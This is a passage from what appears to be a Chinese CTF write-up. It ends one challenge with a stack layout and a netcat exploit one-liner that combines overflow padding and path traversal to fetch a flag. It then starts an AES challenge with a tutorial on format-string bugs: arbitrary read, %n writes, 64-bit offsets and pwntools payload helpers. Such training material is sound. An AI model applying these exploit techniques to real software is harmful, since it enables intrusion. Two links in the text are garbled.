
```
char s1; // [rsp+10h] [rbp-40h]

__int64 v8; // [rsp+20h] [rbp-30h]

...

...

...

 __isoc99_scanf("%s", &s1);

 ...

 ...

 ...

-0000000000000040 s1              db ?

-000000000000003F                 db ? ; undefined

-000000000000003E                 db ? ; undefined

-000000000000003D                 db ? ; undefined

-000000000000003C                 db ? ; undefined

-000000000000003B                 db ? ; undefined

-000000000000003A                 db ? ; undefined

-0000000000000039                 db ? ; undefined

-0000000000000038                 db ? ; undefined

-0000000000000037                 db ? ; undefined

-0000000000000036                 db ? ; undefined

-0000000000000035                 db ? ; undefined

-0000000000000034                 db ? ; undefined

-0000000000000033                 db ? ; undefined

-0000000000000032                 db ? ; undefined

-0000000000000031                 db ? ; undefined

-0000000000000030 var_30          dq ?

-0000000000000028 anonymous_0     dq ?

-0000000000000020 anonymous_1     dq ?

-0000000000000018 anonymous_2     dq ?

-0000000000000010 anonymous_3     dd ?

-000000000000000C anonymous_4     db ?

-000000000000000B                 db ? ; undefined

-000000000000000A                 db ? ; undefined

-0000000000000009                 db ? ; undefined

-0000000000000008 var_8           dq ?

+0000000000000000  s              db 8 dup(?)

+0000000000000008  r              db 8 dup(?)
```

`s1`需填充0x10即16个字节，`v8`填充36个字节。

### exp

```
python -c 'print "kaiokenx20\x00"+"\x00"*5+"././././././././././././././flag.txt\x00\n"+"8"'|nc 128.199.224.175 13000
```

```
sakura@ubuntu:~$ python -c 'print "kaiokenx20\x00"+"\x00"*5+"././././././././././././././flag.txt\x00\n"+"8"'|nc 128.199.224.175 13000



Enter password to authentic yourself : Enter case number: 



     1) Application_1

     2) Application_2

     3) Application_3

     4) Application_4

     5) Application_5

     6) Application_6

     7) Flag



     Enter choice :- 

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX



The flag is :- pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}

r



XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Unbreakable encryption (350pts)

## 题目

### 题目描述

Your friend, Liara, has encrypted all her life secrets, using the one of the best encryptions available in the world, the AES. She has challenged you that no matter what, you can never read her life secrets.

The encryption service is running at :- `128.199.224.175:33000`

The binary file is named `aes_enc`.

Her encrypted life secrets are as follows :-

```
0000 - 40 87 68 1a b0 23 73 c4 61 44 b4 c0 21 f1 63 0b @.h..#s.aD..!.c.
0010 - 73 e9 0d 38 e4 bd d8 33 41 64 2c 43 85 d4 54 0e s..8...3Ad,C..T.
0020 - f5 bc 8c 02 db ee 0d e8 d6 29 81 3a 5f cb 63 bd .........).:_.c.
```

Note: Since some teams were having issues with the buffering of the I/O streams when executing the binary remotely, we have updated the binary file, to flush the output streams properly. The modified binary is named `aes_enc_unbf`, and will be running on `128.199.224.175:33100`.

### 题目链接

001K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2N6r3g2J5L8X3q4D9M7$3q4C8N6i4u0S2i4K6u0r3j5%4c8X3i4K6g2X3M7s2N6F1i4K6u0r3N6s2u0W2k6g2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4m8J5j5h3N6&6j5h3^5J5x3o6p5^5i4K6u0r3N6h3&6T1M7X3g2S2K9$3q4T1L8r3g2Q4y4h3k6W2L8X3y4J5P5i4m8@1K9h3!0F1

## 前置知识

### 格式化字符串漏洞原理

pwn题中，有形如下述代码的形式就是格式化字符串漏洞

```
char str[100];

scanf("%s",str);

printf(str)
```

也许使用者的目的只是直接输出字符串，但是这段字符串来源于可控的输入，就造成了漏洞。

示例程序如下

```
#include <stdio.h>

int main(){

  char str[100];

  scanf("%s",str);

  printf(str)

}
```

编译：`gcc -m32 -o str str.c`

输入：`%2$x`

![](https://bbs.kanxue.com/upload/attach/202208/721335_7U6FUTSZ5PUUU2H.jpg)

![](https://bbs.kanxue.com/upload/attach/202208/721335_S2P5QWGDC5JXP26.jpg)

原因是如果直接`printf("占位符")`这种形式，就会把栈上的偏移当做数据输出出来。通过构造格式化串，就可以实现任意地址读和任意地址写。

### 任意地址读

事实上，我们在`scanf`(或者`read`)来输入字符串的时候，字符串就已经在栈中了，如图，可以看出偏移为6。如果我们构造出`addr(4字节)%6$s`，就能读取这个地址的值了。

![](https://bbs.kanxue.com/upload/attach/202208/721335_8WSXGZHANXU3ZXJ.jpg)

我们尝试一下，输入`AAAA%6$s`，当然不可能真的读到地址为41414141的内存值，不过从下图我框起来的内容就知道，如果我们输入一个合法的值，就可以读了。

![](https://bbs.kanxue.com/upload/attach/202208/721335_4RKNV99MMAKP5KF.jpg)

### 任意地址写

和上面的任意地址读是同理的，只不过利用了格式化字符串的一个比较冷门的特性，`%n`。

这个占位符可以把它前面输出的字符的数量，写入指定的地址。

比如

```
printf("abc%n", &val);

```

`val`的值就被改变为3。

### 64位格式化字符串

下述示例来源于RE4B。

```
#include <stdio.h>

int main() {

        printf("a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d

", 1, 2, 3, 4, 5, 6, 7, 8);

        return 0;

};

```

linux上优先使用`RDI`，`RSI`，`RDX`，`RCX`，`R8`，`R9`寄存器传递前6个参数，然后利用栈传递其余参数。

汇编代码如下

```
.LC0:

    .string "a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d

"



main:

    sub     rsp, 40



    mov     r9d, 5 #第6个参数

    mov     r8d, 4 #第5个参数

    mov     ecx, 3 #第4参数

    mov     edx, 2 #第3个参数

    mov     esi, 1 #第2个参数

    mov     edi, OFFSET FLAT:.LC0 #第1个参数

    xor     eax, eax ; number of vector registers passed

    mov     DWORD PTR [rsp+16], 8 #第9个参数

    mov     DWORD PTR [rsp+8], 7 #第8个参数

    mov     DWORD PTR [rsp], 6 #第7个参数

    call    printf



    ; return 0



    xor     eax, eax

    add     rsp, 40

    ret

```

所以有

```
(gdb) info registers

rax     0x0     0

rbx     0x0     0

rcx     0x3     3

rdx     0x2     2

rsi     0x1     1

rdi     0x400628 4195880

rbp     0x7fffffffdf60 0x7fffffffdf60

rsp     0x7fffffffdf38 0x7fffffffdf38

r8      0x4     4

r9      0x5     5

r10     0x7fffffffdce0 140737488346336

r11     0x7ffff7a65f60 140737348263776

r12     0x400440 4195392

r13     0x7fffffffe040 140737488347200

r14     0x0     0

r15     0x0     0

rip     0x7ffff7a65f60 0x7ffff7a65f60 <__printf>

...
```

```
(gdb) x/10g $rsp

0x7fffffffdf38: 0x0000000000400576 -> 返回地址 0x0000000000000006

0x7fffffffdf48: 0x0000000000000007 0x00007fff00000008

0x7fffffffdf58: 0x0000000000000000 0x0000000000000000

0x7fffffffdf68: 0x00007ffff7a33de5 0x0000000000000000

0x7fffffffdf78: 0x00007fffffffe048 0x0000000100000000
```

**所以在64位格式化字符串漏洞利用时，要注意如何计算偏移，因为即使没有占位符，我们依然是按照这个传参规则来读取变量的。**

### pwntools

#### fmtstr

54eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8%4L8Y4c8G2L8$3I4K6i4K6u0W2M7X3g2S2k6s2c8Z5k6h3c8G2j5%4y4Q4x3X3g2A6L8#2)9J5c8X3g2F1i4K6u0r3M7%4c8S2j5X3I4W2i4K6u0r3k6X3#2@1M7%4c8J5i4K6u0W2K9s2c8E0L8l9`.`.

上面说过我们要利用格式化串漏洞就要得到格式化串的偏移,`pwntools`有自动化代码可以得到这个偏移。

```
# -*- coding: utf-8 -*-

from pwn import *



def exec_fmt(payload):

    p = process(program)

    p.sendline(payload)

    info = p.recv()

    p.close()

    return info



autofmt = FmtStr(exec_fmt)

print autofmt.offset
```

#### fmtstr_payload

生成任意地址写的payload的函数.

```
fmtstr_payload(offset, {key: value})

```

`fmtstr_payload`有两个参数

- 第一个参数是int，用于表示取参数的偏移个数

- 第二个参数是字典，字典的意义是往`key`的地址，写入`value`的值

## 分析

### checksec

```
sakura@ubuntu:~/unbreakable_encryption$ checksec aes_enc_unbf 

[*] '/home/sakura/unbreakable_encryption/aes_enc_unbf'

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```

### 静态链接

```
sakura@ubuntu:~/unbreakable_encryption$ ldd aes_enc_unbf 

    not a dynamic executable

```

### 程序功能

```
sakura@ubuntu:~/unbreakable_encryption$ ./aes_enc_unbf 



Enter message :- 

sakura



Your message is :- 

sakura





 The encrypted message for the given plaintext is :- 

0000 - b2 c4 08 6e 77 66 cb 59-b3 6a 4a 8b ed 35 98 05   ...nwf.Y.jJ..5..



Decrypted text is:

sakura
```

读取输入并打印，并将其传递给`encrypt`，加载aes文件，加密消息并将其输出到屏幕。

然后它调用`decrypt`解密，并将明文输出到屏幕上。

### 栈溢出
